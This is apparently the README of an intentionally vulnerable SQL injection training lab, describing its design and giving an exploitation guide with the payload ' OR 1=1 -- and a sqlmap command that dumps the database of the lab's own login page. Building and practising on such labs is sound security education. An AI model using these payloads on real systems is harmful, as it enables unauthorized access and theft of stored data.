# SQL Injection Login Bypass Lab
### Developed by: Ghariani Oussema

This is a vulnerable web application designed for educational purposes to demonstrate **SQL Injection (SQLi)** vulnerabilities.

##  Live Demo
[Click here to access the Lab](https://sqli-login-bypass-lab.onrender.com)

##  Features
- **Magical Glow UI:** Modern and sleek dark-mode design.
- **Vulnerable Backend:** Purposefully weak SQL query to demonstrate authentication bypass.
- **Educational Payload:** Practice manual exploitation and automated tools like SQLMap.

## Exploitation Guide
1. **Manual Bypass:** Use `' OR 1=1 --` in the username field.
2. **Automated Tool:** ```bash
   sqlmap -u "[https://sqli-login-bypass-lab.onrender.com/login](https://sqli-login-bypass-lab.onrender.com/login)" --data="username=admin&password=123" --dump
